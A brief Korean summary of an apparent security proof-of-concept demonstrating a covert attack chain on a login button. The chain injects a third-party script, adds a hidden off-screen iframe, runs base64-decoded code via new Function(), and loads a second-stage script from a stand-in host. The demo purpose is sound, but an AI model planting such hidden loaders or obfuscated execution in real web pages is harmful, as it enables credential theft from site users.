PoC-A 시나리오 요약

로그인 버튼을 누르는 순간, 화면에는 정상 동작처럼 보이는 UX를 유지하면서 외부 스크립트/숨김 iframe/동적 실행을 연쇄로 수행하는 공격 체인을 데모합니다.
  1. 외부 스크립트 동적 삽입: step2_insertExternalScript() → <script src="(thirdparty)/poc-a-thirdparty.js">
  2. 숨김 iframe 동적 삽입: step3_insertHiddenIframe() → <iframe src="(thirdparty)/frame"> (1px + 화면 밖)
  3. atob → Function 실행: step4_atobFunctionDecode() → atob(base64) → new Function(code)()
  4. 폼 제출: 최종적으로 form.submit()
Thirdparty 구성요소(공급망 체인)에서 추가로 하는 일
  • https://example.com/analytics2.js 같은 2차 로더 삽입
  • (thirdparty)/frame2 숨김 iframe 추가 삽입
주의
  • 이 PoC는 데모 목적입니다. 로그인 입력칸에는 실제 계정/비밀번호를 입력하지 마세요.
  • 테스트는 로컬/샌드박스 계정 등 안전한 환경에서 진행하세요.
